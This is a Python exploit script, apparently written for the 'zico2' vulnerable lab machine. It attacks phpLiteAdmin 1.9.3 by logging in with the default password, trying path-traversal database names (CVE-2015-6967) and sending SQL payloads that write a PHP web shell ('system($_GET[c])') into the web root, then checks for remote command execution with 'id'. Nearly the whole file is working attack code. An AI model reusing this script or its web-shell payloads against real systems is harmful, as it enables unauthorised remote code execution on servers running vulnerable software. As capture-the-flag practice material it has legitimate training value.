#!/usr/bin/env python3
"""zico2 RCE - Write pure PHP file via phpLiteAdmin SQLite dump trick"""
import requests
import re

s = requests.Session()
s.headers['User-Agent'] = 'Mozilla/5.0'
s.timeout = 15
BASE = 'http://192.168.18.132'
PHPLITE = f'{BASE}/dbadmin/test_db.php'

# Login
print('[1] Login...')
s.post(PHPLITE, data={'password': 'admin', 'remember': 'on', 'login': 'Login', 'proc_login': 'true'})

# Switch back to test_users
print('[2] Switch to test_users...')
r = s.get(f'{PHPLITE}?switchdb=%2Fusr%2Fdatabases%2Ftest_users', timeout=15)

# phpLiteAdmin v1.9.3 exploit: The trick is that phpLiteAdmin uses SQLite
# and when you create a database with .php extension, the SQLite file header
# is written. But if we can DELETE the file and write a new one...
#
# Better approach: Use SQL to exploit SQLite's write capabilities
# OR: Use the export feature to control what gets written
#
# BEST approach for zico2: Use the LFI + phpLiteAdmin together
# 1. Create a database named something.php
# 2. Insert our PHP payload  
# 3. Use phpLiteAdmin's "Export" to dump SQL
# 4. But the DB file itself IS a file... 
#
# Actually, the real CVE-2015-6967 trick is:
# phpLiteAdmin stores the new database name directly in the filesystem
# If we name it "../../var/www/html/shell.php", it creates shell.php in web root!
# But this only works if $directory is writable and not properly sanitized

print('[3] Trying path traversal in database name (CVE-2015-6967)...')
traversal_names = [
    '../../var/www/html/shell.php',
    '../../var/www/html/s.php',
    '../../../var/www/html/s.php',
    '../html/s.php',
]

for name in traversal_names:
    r = s.post(PHPLITE, data={
        'new_dbname': name,
    }, timeout=15)
    # Check if it was created (no error message)
    if 'error' not in r.text.lower() and 'not found' not in r.text.lower() and 'could not' not in r.text.lower():
        print(f'  {name}: {r.status_code} - seems OK')
        # Try to access it
        r2 = s.get(f'{BASE}/s.php?c=id', timeout=10)
        print(f'  Access /s.php?c=id: {r2.status_code} ({len(r2.text)}B)')
        if 'uid=' in r2.text:
            clean = re.sub(r'<[^>]+>', '', r2.text).strip()
            print(f'  [+] RCE SUCCESS: {clean[:200]}')
            break
        r2 = s.get(f'{BASE}/shell.php?c=id', timeout=10)
        print(f'  Access /shell.php?c=id: {r2.status_code} ({len(r2.text)}B)')
        if 'uid=' in r2.text:
            clean = re.sub(r'<[^>]+>', '', r2.text).strip()
            print(f'  [+] RCE SUCCESS: {clean[:200]}')
            break
    else:
        print(f'  {name}: {r.status_code} - blocked/error')
        # Check for error message
        errors = re.findall(r'(error|warning|could not)[^<]*', r.text, re.I)
        for e in errors[:2]:
            print(f'    Error: {e.strip()[:100]}')
    s.cookies.clear()
    # Re-login
    s.post(PHPLITE, data={'password': 'admin', 'remember': 'on', 'login': 'Login', 'proc_login': 'true'})

# Alternative: Try to use SQLite load_extension or UNION-based file write
print('\n[4] Trying SQLite file write via SQL...')
# Switch back to test_users first
s.post(PHPLITE, data={'password': 'admin', 'remember': 'on', 'login': 'Login', 'proc_login': 'true'})
r = s.get(f'{PHPLITE}?switchdb=%2Fusr%2Fdatabases%2Ftest_users&view=sql', timeout=15)

# Try various SQL file write techniques
sql_payloads = [
    "CREATE TABLE x AS SELECT '<?php system($_GET[c]); ?>' AS a;",
    "SELECT '<?php system($_GET[c]); ?>' INTO OUTFILE '/var/www/html/s.php';",
    ".output /var/www/html/s.php\nSELECT '<?php system($_GET[c]); ?>';",
]

for sql in sql_payloads:
    r2 = s.post(f'{PHPLITE}?switchdb=%2Fusr%2Fdatabases%2Ftest_users&view=sql', data={
        'queryval': sql,
        'delimiter': ';',
        'query': 'Go',
    }, timeout=15)
    has_error = 'error' in r2.text.lower() or 'syntax' in r2.text.lower()
    print(f'  SQL: {sql[:60]}... -> {"ERROR" if has_error else "OK"} ({len(r2.text)}B)')
    if not has_error:
        # Check if file was written
        r3 = s.get(f'{BASE}/s.php?c=id', timeout=10)
        if 'uid=' in r3.text:
            clean = re.sub(r'<[^>]+>', '', r3.text).strip()
            print(f'  [+] RCE SUCCESS: {clean[:200]}')
            break
